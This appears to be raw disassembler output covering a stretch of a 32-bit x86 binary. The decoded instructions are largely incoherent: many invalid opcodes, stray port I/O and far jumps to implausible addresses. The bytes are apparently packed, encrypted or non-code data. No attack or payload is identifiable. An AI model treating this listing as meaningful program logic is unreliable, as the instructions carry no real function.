  42c822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c823:	add    eax,0xd3b90b6e
  42c828:	jbe    0x42c868
  42c82a:	and    BYTE PTR [esi-0x36],bl
  42c82d:	shl    eax,cl
  42c82f:	and    DWORD PTR [eax-0x45079690],0x29551295
  42c839:	ins    DWORD PTR es:[edi],dx
  42c83a:	inc    ebx
  42c83b:	jle    0x42c8a6
  42c83d:	jnp    0x42c8bd
  42c83f:	sahf   
  42c840:	jg     0x42c7da
  42c842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c843:	mov    eax,0x17a17e42
  42c848:	add    al,0xb
  42c84a:	push   esp
  42c84b:	adc    edx,DWORD PTR [edi]
  42c84d:	xchg   ebx,eax
  42c84e:	xchg   esi,eax
  42c84f:	sar    BYTE PTR [eax-0x725586a5],0x2d
  42c856:	(bad)  
  42c857:	and    al,0xb1
  42c859:	outs   dx,DWORD PTR ds:[esi]
  42c85a:	mov    eax,DWORD PTR [esi+0x1a41dad1]
  42c860:	pop    edi
  42c861:	adc    DWORD PTR [ecx+0x39],edi
  42c864:	add    cl,0xba
  42c867:	pop    ecx
  42c868:	jge    0x42c843
  42c86a:	out    0xfe,al
  42c86c:	dec    esi
  42c86d:	xor    ebx,DWORD PTR [eax-0x8e22a64]
  42c873:	lds    eax,FWORD PTR ds:0xb3822415
  42c879:	daa    
  42c87a:	mov    ebx,DWORD PTR [eax]
  42c87c:	xor    edi,DWORD PTR [esi-0x29]
  42c87f:	mov    DWORD PTR [eax],edx
  42c881:	lods   al,BYTE PTR ds:[esi]
  42c882:	fnstsw WORD PTR [edx-0x35]
  42c885:	ror    BYTE PTR [eax+0x1e],1
  42c888:	ret    
  42c889:	push   esi
  42c88a:	fisub  DWORD PTR [ebx+eiz*4-0x115e79fb]
  42c891:	cdq    
  42c892:	(bad)
  42c896:	add    eax,0xd13ac006
  42c89b:	imul   BYTE PTR [edx]
  42c89d:	adc    bl,BYTE PTR [ebx+0x7870cff5]
  42c8a3:	and    cl,BYTE PTR [ebx+0x1967bbe]
  42c8a9:	iret   
  42c8aa:	adc    bh,BYTE PTR [ecx+0x18ccf7f6]
  42c8b0:	mov    esp,0x540f1bb5
  42c8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8b6:	sbb    eax,0x749003d3
  42c8bc:	xor    ah,BYTE PTR [ecx-0x11fc96a6]
  42c8c2:	rol    BYTE PTR [edx-0x5d2bbc86],0xd9
  42c8c9:	adc    cl,bl
  42c8cb:	pop    ebx
  42c8cc:	jo     0x42c880
  42c8ce:	lds    esp,FWORD PTR [ebx+0x4fe24341]
  42c8d4:	push   es
  42c8d5:	sub    al,0x60
  42c8d7:	aam    0xcc
  42c8d9:	add    eax,0x9558b67a
  42c8de:	xor    BYTE PTR ds:0x64f5dd77,cl
  42c8e4:	jne    0x42c94e
  42c8e6:	(bad)  
  42c8e7:	mov    bl,0xa5
  42c8e9:	mov    eax,ds:0xd53d4ccd
  42c8ee:	xor    edx,esp
  42c8f0:	ffree  st(6)
  42c8f2:	pop    ds
  42c8f3:	or     al,0x39
  42c8f5:	inc    esp
  42c8f6:	xlat   BYTE PTR ds:[ebx]
  42c8f7:	test   eax,0x53312b5d
  42c8fc:	pop    esi
  42c8fd:	nop
  42c8fe:	sbb    al,0xe4
  42c900:	add    BYTE PTR [edx+edi*1],bh
  42c903:	push   ss
  42c904:	into   
  42c905:	cs call 0x8ae93ea3
  42c90b:	in     al,0x60
  42c90d:	push   edi
  42c90e:	je     0x42c8f0
	...
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x5336ce5c
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	sbb    ecx,DWORD PTR [edx]
  42c98e:	retf   
  42c98f:	mov    eax,ds:0x69a13b22
  42c994:	fadd   st(4),st
  42c996:	and    ah,BYTE PTR [edi+0x48bc6ed6]
  42c99c:	mov    ecx,0x6111955d
  42c9a1:	mov    ds,WORD PTR [ebp+eax*8+0x4a]
  42c9a5:	std    
  42c9a6:	test   al,0xbe
  42c9a8:	or     DWORD PTR [ecx+ebx*1-0x595aa118],ebp
  42c9af:	sti    
  42c9b0:	pop    esi
  42c9b1:	dec    ecx
  42c9b2:	fdivrp st(4),st
  42c9b4:	stos   BYTE PTR es:[edi],al
  42c9b5:	in     eax,0x36
  42c9b7:	test   DWORD PTR [ebx-0x25],ebx
  42c9ba:	cli    
  42c9bb:	cli    
  42c9bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9bd:	pop    ebx
  42c9be:	das    
  42c9bf:	jbe    0x42c99d
  42c9c1:	int3   
  42c9c2:	les    sp,DWORD PTR [eax]
  42c9c5:	fcmovnb st,st(7)
  42c9c7:	iret   
  42c9c8:	xchg   esp,eax
  42c9c9:	mov    esp,0x17848654
  42c9ce:	sbb    al,0xd8
  42c9d0:	dec    esi
  42c9d1:	xor    DWORD PTR gs:[ebp+esi*4+0x32e22491],edi
  42c9d9:	cdq    
  42c9da:	mov    esi,0xf68f6a14
  42c9df:	inc    esi
  42c9e0:	aas    
  42c9e1:	inc    edx
  42c9e2:	mov    ds:0x24acc775,al
  42c9e7:	mov    eax,0xe3245d88
  42c9ec:	(bad)  [ecx-0x5c]
  42c9ef:	jge    0x42c9be
  42c9f1:	sub    DWORD PTR [edx-0x4b],0xffffffb9
  42c9f5:	push   edx
  42c9f6:	aaa    
  42c9f7:	or     DWORD PTR [ecx],ebp
  42c9f9:	pop    ebp
  42c9fa:	repz icebp 
  42c9fc:	mov    al,0x39
  42c9fe:	arpl   WORD PTR [edi+0x1e974904],bx
  42ca04:	xor    ch,BYTE PTR ds:[ebx+esi*1-0x31eb81a7]
  42ca0c:	cmc    
  42ca0d:	lahf   
  42ca0e:	sti    
  42ca0f:	fcomp  st(2)
  42ca11:	popf   
  42ca12:	fist   WORD PTR [ebp+0x42503a9d]
  42ca18:	out    dx,eax
  42ca19:	xor    BYTE PTR [ebx],al
  42ca1b:	mov    bh,0xa
  42ca1d:	xchg   BYTE PTR [eax+ecx*1+0x37],cl
  42ca21:	imul   ebx,DWORD PTR [ebp+0x58f6394c],0x7c1025ab
  42ca2b:	pop    esp
  42ca2c:	mov    dh,0xd3
  42ca2e:	mov    ch,0xa3
  42ca30:	sub    DWORD PTR [ecx],0xffffffa4
  42ca33:	jo     0x42ca41
  42ca35:	mov    bh,0xe6
  42ca37:	into   
  42ca38:	mov    ebx,0xef8eb43
  42ca3d:	arpl   WORD PTR [edx+0x5cd1588f],sp
  42ca43:	adc    dl,BYTE PTR [esi+eiz*1+0xaba0a4a]
  42ca4a:	xchg   edi,eax
  42ca4b:	js     0x42ca0c
  42ca4d:	sbb    al,0xf2
  42ca4f:	shr    BYTE PTR [edx+0x3b1bc267],cl
  42ca55:	jecxz  0x42ca54
  42ca57:	and    eax,0xeb1ecdd9
  42ca5c:	add    al,0xf5
  42ca5e:	jne    0x42c9e6
  42ca60:	(bad)  
  42ca61:	in     al,0xdd
  42ca63:	sbb    al,0x4d
  42ca65:	sub    eax,DWORD PTR [edi+0x6344ea6a]
  42ca6b:	mov    esp,0x47296445
  42ca70:	mov    esp,0x1c3f0be3
  42ca75:	test   DWORD PTR [ecx+0x488c791f],edx
  42ca7b:	sub    edi,DWORD PTR [ebx+0x68]
  42ca7e:	pop    es
  42ca7f:	sub    BYTE PTR [eax+0x46c3a6a6],bl
  42ca85:	cmc    
  42ca86:	cmp    al,0x5f
  42ca88:	and    eax,0x4226610c
  42ca8d:	sbb    BYTE PTR [esi],0x31
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x762e9140]
  42cb02:	leave  
  42cb03:	cmp    eax,0x1ddfc
  42cb08:	add    al,0x1
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	xchg   edi,eax
  42cb0d:	sub    ah,bl
  42cb0f:	bound  esi,QWORD PTR [edi-0x58577618]
  42cb15:	pop    ds
  42cb16:	imul   eax,DWORD PTR [edx-0x6c],0x99511c10
  42cb1d:	adc    al,0x4d
  42cb1f:	sub    al,0x88
  42cb21:	mov    ah,0xac
  42cb23:	scas   eax,DWORD PTR es:[edi]
  42cb24:	push   eax
  42cb25:	ds hlt 
  42cb27:	jp     0x42cb6a
  42cb29:	jmp    0x4ff8:0x7f9f6c49
  42cb30:	and    ebp,DWORD PTR [esi+ebp*2]
  42cb33:	mov    edi,DWORD PTR [eax]
  42cb35:	and    DWORD PTR [esi],esi
  42cb37:	mov    dl,0xb6
  42cb39:	mov    dh,0x30
  42cb3b:	pop    esi
  42cb3c:	lods   al,BYTE PTR ds:[esi]
  42cb3d:	pop    ecx
  42cb3e:	lock and DWORD PTR [edx-0x44],ebp
  42cb42:	inc    ebx
  42cb43:	xor    DWORD PTR [eax],ebp
  42cb45:	xor    BYTE PTR [edx-0x1],dl
  42cb48:	or     BYTE PTR [edi+0x148352cc],0x5d
  42cb4f:	fcom   QWORD PTR [edx-0x677d385e]
  42cb55:	dec    esp
  42cb56:	xlat   BYTE PTR ds:[ebx]
  42cb57:	fidiv  DWORD PTR [ebx+0x2f61ad0b]
  42cb5d:	outs   dx,DWORD PTR ds:[esi]
  42cb5e:	nop
  42cb5f:	cmp    ecx,DWORD PTR [edx]
  42cb61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb62:	or     esp,ebp
  42cb64:	mov    al,0xd5
  42cb66:	popa   
  42cb67:	mov    dh,0xd7
  42cb69:	je     0x42cb4d
  42cb6b:	das    
  42cb6c:	dec    eax
  42cb6d:	fs lahf 
  42cb6f:	xchg   ebx,eax
  42cb70:	mov    ecx,0xdd948338
  42cb75:	sar    DWORD PTR [edx-0x5d3b763f],0x43
  42cb7c:	mov    WORD PTR [ebp-0x7dc0f66d],cs
  42cb82:	jb     0x42cb94
  42cb84:	test   eax,0x54535c54
  42cb89:	into   
  42cb8a:	es sub edx,edi
  42cb8d:	stos   DWORD PTR es:[edi],eax
  42cb8e:	or     ebp,ebx
  42cb90:	hlt    
  42cb91:	rcl    BYTE PTR [edx+0x2f],cl
  42cb94:	jl     0x42cb4e
  42cb96:	add    eax,eax
  42cb98:	jmp    0x42cbfd
  42cb9a:	jae    0x42cbd2
  42cb9c:	jno    0x42cb35
  42cb9e:	sub    eax,0xb4c23818
  42cba3:	cdq    
  42cba4:	jmp    0x42cb89
  42cba6:	dec    ecx
  42cba7:	in     al,0x82
  42cba9:	das    
  42cbaa:	mov    ebx,eax
  42cbac:	or     dl,ch
  42cbae:	push   eax
  42cbaf:	test   DWORD PTR es:[edx+0x7a],ebx
  42cbb3:	fadd   QWORD PTR [eax-0x72]
  42cbb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cbb7:	fist   WORD PTR [edx-0x8]
  42cbba:	popf   
  42cbbb:	mov    esp,0xfceb24be
  42cbc0:	ins    BYTE PTR es:[edi],dx
  42cbc1:	stos   BYTE PTR es:[edi],al
  42cbc2:	xchg   edx,eax
  42cbc3:	inc    BYTE PTR [esi+0x3ff14b70]
  42cbc9:	push   cs
  42cbca:	in     al,dx
  42cbcb:	push   ss
  42cbcc:	mov    edx,0xca72d7c0
  42cbd1:	test   eax,0x7a144a4a
  42cbd6:	pop    ebp
  42cbd7:	adc    BYTE PTR [eax],ch
  42cbd9:	sbb    al,0x2
  42cbdb:	or     bl,bh
  42cbdd:	mov    eax,0x53ad0557
  42cbe2:	mov    edi,0x4d17b900
  42cbe7:	jb     0x42cc26
  42cbe9:	pop    edx
  42cbea:	hlt    
  42cbeb:	xchg   esi,eax
  42cbec:	push   ecx
  42cbed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cbee:	shr    DWORD PTR [eax],cl
  42cbf0:	in     eax,0x77
  42cbf2:	xor    bl,BYTE PTR [esi-0x1f697890]
  42cbf8:	jne    0x42cc34
  42cbfa:	jne    0x42cbc2
  42cbfc:	scas   al,BYTE PTR es:[edi]
  42cbfd:	jmp    0xb363e22d
  42cc02:	leave  
  42cc03:	int    0x56
  42cc05:	adc    dh,dh
  42cc07:	arpl   WORD PTR [eax],si
  42cc09:	sub    DWORD PTR [ebx+0x5d],0x838cc9b
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xc28e4e52
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	add    bl,al
  42cc8e:	pusha  
  42cc8f:	(bad)  
  42cc90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc91:	add    BYTE PTR [edi+0x2271c470],bh
  42cc97:	fisttp WORD PTR [ecx]
  42cc99:	add    eax,0x2ab389f9
  42cc9e:	push   0x15
  42cca0:	mulps  xmm6,XMMWORD PTR [eax-0x529e0822]
  42cca7:	dec    ebp
  42cca8:	in     al,0x43
  42ccaa:	sar    BYTE PTR ds:[ebx+eiz*1],cl
  42ccae:	lods   al,BYTE PTR ds:[esi]
  42ccaf:	mov    ebx,0xde0aad2e
  42ccb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccb5:	jmp    0x42cc5f
  42ccb7:	cmp    esi,esi
  42ccb9:	gs pop ecx
  42ccbb:	pop    eax
  42ccbc:	xchg   BYTE PTR [edx+0x2411482c],dh
  42ccc2:	mov    dh,0x74
  42ccc4:	push   edi
  42ccc5:	ins    DWORD PTR es:[edi],dx
  42ccc6:	lea    ebp,[edi+0x66]
  42ccc9:	popf   
  42ccca:	in     al,dx
  42cccb:	adc    dl,dl
  42cccd:	mov    ah,0x6c
  42cccf:	inc    ebx
  42ccd0:	cmp    ch,BYTE PTR [edi+0x1d]
  42ccd3:	int    0xef
  42ccd5:	xchg   BYTE PTR [ecx],bh
  42ccd7:	jo     0x42cc84
  42ccd9:	sub    dh,BYTE PTR [esi-0x13423efb]
  42ccdf:	or     dl,bl
  42cce1:	dec    edi
  42cce2:	mov    DWORD PTR [edi-0x4ab5786e],edx
  42cce8:	mov    al,0xb6
  42ccea:	pop    edx
  42cceb:	cmp    ebx,edi
  42cced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ccee:	pushf  
  42ccef:	sahf   
  42ccf0:	sar    BYTE PTR [edi+0x4b],1
  42ccf3:	or     eax,0xac87afbc
  42ccf8:	out    dx,eax
  42ccf9:	(bad)  
  42ccfa:	arpl   WORD PTR [ebx],sp
  42ccfc:	or     al,0x71
  42ccfe:	xor    al,0xb8
  42cd00:	xor    eax,0xde8ac9f9
  42cd05:	xchg   edi,eax
  42cd06:	call   0x48e7ee49
  42cd0b:	ja     0x42cc99
  42cd0d:	xchg   esi,eax
  42cd0e:	dec    ebx
  42cd0f:	dec    edx
  42cd10:	sub    ecx,edx
  42cd12:	pop    esp
  42cd13:	xor    DWORD PTR [edi-0x31],0x56
  42cd17:	dec    edi
  42cd18:	push   eax
  42cd19:	ret    
  42cd1a:	mov    ah,dl
  42cd1c:	es mov edi,0x3cdff4ef
  42cd22:	mov    ch,0x78
  42cd24:	and    BYTE PTR [edi-0x54],dh
  42cd27:	mov    gs,WORD PTR [ebx+ebp*2-0x63]
  42cd2b:	push   edx
  42cd2c:	pushf  
  42cd2d:	test   al,0x9a
  42cd2f:	in     eax,dx
  42cd30:	jne    0x42cd62
  42cd32:	loopne 0x42ccca
  42cd34:	push   ss
  42cd35:	add    al,0xdb
  42cd37:	nop
  42cd38:	rol    BYTE PTR [edi+0x6f39829c],1
  42cd3e:	cmp    DWORD PTR ss:[esi+0x2a],edx
  42cd42:	setb   BYTE PTR [esi+0x3f]
  42cd46:	clc    
  42cd47:	mov    esi,0xe0a0e908
  42cd4c:	add    DWORD PTR [edi+0x5840a518],0xa66055c6
  42cd56:	(bad)
  42cd5a:	jmp    0xa7f4:0xa394952b
  42cd61:	sbb    al,0x7d
  42cd63:	ins    BYTE PTR es:[edi],dx
  42cd64:	loop   0x42cd3a
  42cd66:	cmp    bh,BYTE PTR [esi+0x3d]
  42cd69:	xor    DWORD PTR [ebx-0x24],ebx
  42cd6c:	mov    cl,0x14
  42cd6e:	mov    ds:0x4da9c0d2,eax
  42cd73:	and    ebx,DWORD PTR [esp+eiz*2]
  42cd76:	jnp    0x42cdd3
  42cd78:	cmp    DWORD PTR [ebp-0x77],eax
  42cd7b:	fwait
  42cd7c:	neg    edi
  42cd7e:	das    
  42cd7f:	push   edi
  42cd80:	sbb    dh,0xe5
  42cd83:	inc    ebx
  42cd84:	sub    ebx,ebx
  42cd86:	inc    edx
  42cd87:	cdq    
  42cd88:	pop    esi
  42cd89:	push   ecx
  42cd8a:	jo     0x42cde9
  42cd8c:	mov    ebx,0xe3620d
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xcb
  42ce01:	repnz sahf 
  42ce03:	jnp    0x42ce09
  42ce05:	loopne 0x42ce08
  42ce07:	add    BYTE PTR [ecx+eax*1],al
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	test   DWORD PTR [ebp-0x23b5d816],0xc58f457b
  42ce16:	rcr    DWORD PTR [edx],cl
  42ce18:	jmp    0x42ce6e
  42ce1a:	outs   dx,BYTE PTR ds:[esi]
  42ce1b:	icebp  
  42ce1c:	popa   
  42ce1d:	or     DWORD PTR [edi-0x571b8aa9],edi
  42ce23:	mov    ch,0x6b
  42ce25:	ss aad 0x71
  42ce28:	push   ds
  42ce29:	add    al,0x81
  42ce2b:	cmp    al,0x99
  42ce2d:	loopne 0x42cdfb
  42ce2f:	stos   DWORD PTR es:[edi],eax
  42ce30:	sbb    eax,0x98e26ed9
  42ce35:	frstor [bx]
  42ce38:	call   0xdc533bfc
  42ce3d:	(bad)  
  42ce3e:	cld    
  42ce3f:	sti    
  42ce40:	fwait
  42ce41:	je     0x42cdfc
  42ce43:	jl     0x42ce2e
  42ce45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce46:	add    BYTE PTR [esi],dl
  42ce48:	xor    dh,ah
  42ce4a:	jecxz  0x42cde1
  42ce4c:	in     eax,0x8e
  42ce4e:	sar    BYTE PTR [eax+0x69],cl
  42ce51:	addr16 out 0x44,eax
  42ce54:	mov    BYTE PTR ds:0x2f1594,bh
  42ce5a:	jae    0x42ce26
  42ce5c:	hlt    
  42ce5d:	(bad)  
  42ce5e:	sbb    edi,DWORD PTR [ebp+0x3951d0c0]
  42ce64:	retf   0x18d8
  42ce67:	cmp    al,0x9c
  42ce69:	cmp    esi,esi
  42ce6b:	mov    ds:0xbe4e585a,eax
  42ce70:	(bad)  
  42ce71:	icebp  
  42ce72:	add    eax,0x56e84f50
  42ce77:	adc    ch,BYTE PTR [ebx]
  42ce79:	sbb    DWORD PTR [edx],edi
  42ce7b:	out    0xf8,eax
  42ce7d:	mov    dh,0x5b
  42ce7f:	in     eax,dx
  42ce80:	rcl    DWORD PTR [ebp+0x2242a235],1
  42ce86:	cwde   
  42ce87:	ja     0x42ce67
  42ce89:	adc    DWORD PTR [ebp-0x494486c9],ecx
  42ce8f:	arpl   WORD PTR [ecx-0x43],dx
  42ce92:	push   eax
  42ce93:	mov    al,0x3f
  42ce95:	pop    esi
  42ce96:	sbb    al,cl
  42ce98:	jge    0x42ceb8
  42ce9a:	out    0x3,al
  42ce9c:	push   esp
  42ce9d:	repnz arpl bx,sp
  42cea0:	adc    cl,BYTE PTR [eax+0x47ca1348]
  42cea6:	jmp    0x1dfa8758
  42ceab:	jecxz  0x42cebc
  42cead:	xor    dl,BYTE PTR [edi+0x3f496176]
  42ceb3:	enter  0x2166,0x24
  42ceb7:	pop    eax
  42ceb8:	data16 cli 
  42ceba:	mov    ah,0x3a
  42cebc:	fmul   QWORD PTR [edx+0x76dc1bfc]
  42cec3:	pop    ebp
  42cec4:	add    BYTE PTR [ebp+0x46],0xb7
  42cec8:	stc    
  42cec9:	pusha  
  42ceca:	mov    cl,BYTE PTR [eax+0x322134b7]
  42ced0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ced1:	xchg   edi,eax
  42ced2:	mov    ecx,0x58b1d030
  42ced7:	out    0xe2,eax
  42ced9:	push   esp
  42ceda:	dec    esi
  42cedb:	popa   
  42cedc:	popa   
  42cedd:	leave  
  42cede:	in     eax,0x19
  42cee0:	sbb    cl,0xfb
  42cee3:	(bad)  
  42cee4:	jge    0x42ce80
  42cee6:	cmp    BYTE PTR [ebx+0x38],0xde
  42ceea:	mov    cr1,ebp
  42ceed:	retf   0xa87b
  42cef0:	dec    esi
  42cef1:	push   edi
  42cef2:	ss jmp 0x42cf13
  42cef5:	xchg   esp,eax
  42cef6:	and    al,0x35
  42cef8:	jo     0x42cf22
  42cefa:	mov    bl,0x7f
  42cefc:	mov    ds:0x3327208,al
  42cf01:	sti    
  42cf02:	inc    edx
  42cf03:	push   esi
  42cf04:	out    dx,al
  42cf05:	push   0xe22641f2
  42cf0a:	mov    ah,0xd7
  42cf0c:	pop    ss
  42cf0d:	(bad)  
  42cf0e:	cmp    al,0xfc
	...
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    esi,FWORD PTR [edi+0x822fe1d]
  42cf85:	loope  0x42cf88
  42cf87:	add    BYTE PTR [ecx+eax*1],al
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	pop    ss
  42cf8d:	ja     0x42cfb6
  42cf8f:	cmovg  eax,DWORD PTR [edi+0x254b4778]
  42cf96:	or     al,BYTE PTR [esi]
  42cf98:	shl    dh,1
  42cf9a:	add    ch,al
  42cf9c:	enter  0xb0ed,0x38
  42cfa0:	cwde   
  42cfa1:	repz adc al,0xee
  42cfa4:	in     al,0xad
  42cfa6:	mov    ebp,0x9b89ff9a
  42cfab:	mov    edx,0xf4b9a415
  42cfb0:	ins    DWORD PTR es:[edi],dx
  42cfb1:	jmp    0x42cf4e
  42cfb3:	icebp  
  42cfb4:	xchg   esp,eax
  42cfb5:	loopne 0x42cf39
  42cfb7:	jne    0x42cf6e
  42cfb9:	xor    al,0x74
  42cfbb:	test   ah,ch
  42cfbd:	mov    esp,0x9be0ae45
  42cfc2:	retf   0x6f65
  42cfc5:	(bad)  
  42cfc6:	adc    DWORD PTR ds:0x20856a3b,esp
  42cfcc:	or     edx,ecx
  42cfce:	test   al,0xfa
  42cfd0:	scas   eax,DWORD PTR es:[edi]
  42cfd1:	or     DWORD PTR [eax-0x670552cf],0xab01cabe
  42cfdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfdc:	sub    DWORD PTR [edi-0x5a4f1808],ecx
  42cfe2:	push   ds
  42cfe3:	mov    esi,0x6d411f0f
  42cfe8:	cdq    
  42cfe9:	popf   
  42cfea:	add    BYTE PTR [esi],cl
  42cfec:	test   BYTE PTR [edx+0x58],cl
  42cfef:	std    
  42cff0:	mov    ebp,0x8150b64c
  42cff5:	lods   eax,DWORD PTR ds:[esi]
  42cff6:	scas   eax,DWORD PTR es:[edi]
  42cff7:	mov    DWORD PTR [esi-0x2ddd7ade],esp
  42cffd:	dec    edx
  42cffe:	xchg   BYTE PTR [esi],al
  42d000:	xlat   BYTE PTR ds:[ebx]
  42d001:	pop    ss
  42d002:	and    ecx,DWORD PTR [edx-0x1b63fbc7]
  42d008:	sbb    DWORD PTR [edi+0x3d6de866],ebx
  42d00e:	cmc    
  42d00f:	and    ah,BYTE PTR [edi+0x6d]
  42d012:	sub    ebx,DWORD PTR [eax-0x15]
  42d015:	ret    
  42d016:	aad    0xca
  42d018:	pop    ebx
  42d019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d01a:	xor    eax,0x6e0d4f6f
  42d01f:	add    al,0xdb
  42d021:	pop    edx
  42d022:	stc    
  42d023:	out    0x7c,al
  42d025:	cli    
  42d026:	test   eax,0xe8a6dcf4
  42d02b:	enter  0x515a,0x9c
  42d02f:	in     eax,0xd8
  42d031:	into   
  42d032:	nop
  42d033:	test   eax,0x926900c
  42d038:	mov    ds:0x6d45eb4c,eax
  42d03d:	ror    DWORD PTR [ecx],0x25
  42d040:	daa    
  42d041:	jne    0x42cfed
  42d043:	ins    DWORD PTR es:[edi],dx
  42d044:	inc    ecx
  42d045:	inc    ebx
  42d046:	xor    ebp,ecx
  42d048:	leave  
  42d049:	ins    BYTE PTR es:[edi],dx
  42d04a:	leave  
  42d04b:	mov    BYTE PTR [eax-0x39],cl
  42d04e:	int3   
  42d04f:	fs rcr BYTE PTR ds:[ecx],cl
  42d053:	fs in  eax,dx
  42d055:	push   edx
  42d056:	cmp    bh,BYTE PTR [ecx]
  42d058:	mov    ah,0x52
  42d05a:	add    al,0xc0
  42d05c:	sub    al,0x1d
  42d05e:	pop    ebp
  42d05f:	outs   dx,BYTE PTR ds:[esi]
  42d060:	add    al,0x4f
  42d062:	sub    al,0xc9
  42d064:	scas   al,BYTE PTR es:[edi]
  42d065:	imul   esp,edx,0xffffffcb
  42d068:	jp     0x42cff4
  42d06a:	jne    0x42d053
  42d06c:	test   DWORD PTR [ebx],edx
  42d06e:	mov    edi,0xb24300fb
  42d073:	push   esi
  42d074:	mov    cl,0x5e
  42d076:	cmp    eax,0x8c6176b6
  42d07b:	call   0x28166a24
  42d080:	hlt    
  42d081:	cdq    
  42d082:	jle    0x42d06b
  42d084:	inc    edi
  42d085:	and    BYTE PTR [eax],ch
  42d087:	pop    ebx
  42d088:	ds ret 0x9db2
  42d08c:	aas    
  42d08d:	mov    bh,0x38
  42d08f:	cmp    eax,0x0
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [ebx],bh
  42d101:	ret    0x71b8
  42d104:	or     al,0xe2
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	xchg   esi,eax
  42d10d:	push   ss
  42d10e:	xor    eax,0xc9783850
  42d113:	test   DWORD PTR cs:[ecx-0x3eef403b],edx
  42d11a:	mov    ch,0xb5
  42d11c:	fwait
  42d11d:	(bad)  
  42d11f:	int3   
  42d120:	jmp    0x42d0b8
  42d122:	ins    DWORD PTR es:[edi],dx
  42d123:	call   0xf0d840a0
  42d128:	retf   0xace2
  42d12b:	and    eax,0x4074f88d
  42d130:	ss faddp st(0),st
  42d133:	outs   dx,DWORD PTR ds:[esi]
  42d134:	aad    0x22
  42d136:	push   ebx
  42d137:	sahf   
  42d138:	shl    BYTE PTR [ebp+0x3],1
  42d13b:	push   esp
  42d13c:	and    edx,DWORD PTR [esi+ecx*8-0x29]
  42d140:	stos   DWORD PTR es:[edi],eax
  42d141:	inc    esi
  42d142:	mov    eax,ds:0x40f8b3f3
  42d147:	sbb    eax,0x758901c3
  42d14c:	xchg   edx,eax
  42d14d:	mov    ah,0x5a
  42d14f:	cmp    bl,BYTE PTR [edx+0x33bf89d]
  42d155:	ja     0x42d13a
  42d157:	(bad)  
  42d159:	dec    edx
  42d15a:	xchg   ebx,eax
  42d15b:	aad    0x6
  42d15d:	adc    BYTE PTR [edx+0x4b],0xc3
  42d161:	mov    esp,0x189593d3
  42d166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d167:	mov    edi,0x5069dfc5
  42d16c:	cmp    DWORD PTR [edi],edx
  42d16e:	scas   al,BYTE PTR es:[edi]
  42d16f:	mov    al,0x4
  42d171:	cmp    esi,esp
  42d173:	cmp    al,0xd9
  42d175:	pop    esi
  42d176:	js     0x42d1f7
  42d178:	cmp    BYTE PTR [ebx+0x76],0x2e
  42d17c:	xlat   BYTE PTR ds:[ebx]
  42d17d:	call   0xeb15c43a
  42d182:	mov    ds:0x43842a4a,al
  42d187:	mov    edi,0x7ca29b2c
  42d18c:	mov    ah,0xd7
  42d18e:	pop    sp
  42d190:	cld    
  42d191:	mov    edx,DWORD PTR [eax+ebx*2-0x1c74266]
  42d198:	push   edx
  42d199:	mov    ebx,0x633b0324
  42d19e:	leave  
  42d19f:	jge    0x42d168
  42d1a1:	mov    cl,0x4b
  42d1a3:	dec    edi
  42d1a4:	aaa    
  42d1a5:	loopne 0x42d1ef
  42d1a7:	cmc    
  42d1a8:	adc    ebx,DWORD PTR [ebx+0x3b]
  42d1ab:	jg     0x42d1ad
  42d1ad:	add    DWORD PTR [ecx-0xf],edx
  42d1b0:	adc    al,0xce
  42d1b2:	in     al,dx
  42d1b3:	jmp    0x4d8b432
  42d1b8:	imul   ebx,DWORD PTR [esi+0x32],0xffffff86
  42d1bc:	call   0x89739696
  42d1c1:	mov    eax,0x798561a1
